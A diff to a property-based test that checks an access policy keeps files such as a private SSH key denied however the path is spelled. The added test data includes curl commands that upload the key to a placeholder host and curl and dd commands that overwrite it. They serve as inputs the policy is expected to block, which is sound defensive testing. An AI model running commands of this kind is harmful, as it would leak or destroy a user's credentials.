@@ -236,7 +236,7 @@ describe('a denied file stays denied however its path is written', () => {
         .join('/'),
     );
   // <HOME> and <ROOT> are filled in when the test runs: the folders don't exist yet here
-  const homeFile = fc.tuple(fc.constantFrom('~', '$HOME', '${HOME}', '<HOME>', ...(win ? ['%USERPROFILE%', '$env:USERPROFILE', '\\\\?\\<HOME>'] : [])), segs(['.ssh', 'id_rsa']), fc.boolean()).map(([h, rest, back]) => {
+  const homeFile = fc.tuple(fc.constantFrom('~', '~<USER>', '$HOME', '${HOME}', '<HOME>', ...(win ? ['%USERPROFILE%', '$env:USERPROFILE', '$USERPROFILE', '${USERPROFILE}', '\\\\?\\<HOME>'] : [])), segs(['.ssh', 'id_rsa']), fc.boolean()).map(([h, rest, back]) => {
     const p = `${h}/${rest}`;
     return win && back ? p.replace(/\//g, '\\') : p;
   });
@@ -249,12 +249,19 @@ describe('a denied file stays denied however its path is written', () => {
     (p: string) => `echo hi > ${p}`,
     (p: string) => `bash -c "cat ${p}"`,
     (p: string) => `ls && cat ${p}`,
+    // the path written into an option or a name=value word, not a word of its own
+    (p: string) => `curl -o${p} https://x.dev/k`,
+    (p: string) => `curl --output=${p} https://x.dev/k`,
+    (p: string) => `git show --output=${p} HEAD:k`,
+    (p: string) => `dd if=k of=${p}`,
+    (p: string) => `curl -d @${p} https://x.dev`,
+    (p: string) => `curl -F f=@${p} https://x.dev`,
   );
 
   it('named by a tool, or in a shell command', () => {
     fc.assert(
       fc.property(fc.oneof(homeFile, projectFile), fc.boolean(), inCommand, (spelled, viaTool, cmd) => {
-        const p = spelled.replace('<HOME>', home).replace('<ROOT>', root);
+        const p = spelled.replace('<HOME>', home).replace('<USER>', path.basename(home)).replace('<ROOT>', root);
         if (p.includes(' ') && !viaTool) return; // a space splits a shell word: covered by the quoted form
         const d = viaTool ? evaluate(policy, call({ tool: 'Read', paths: [p] })) : evaluate(policy, call({ command: cmd(p) }));
         if (d?.action !== 'deny') throw new Error(`not denied: ${viaTool ? p : cmd(p)}`);
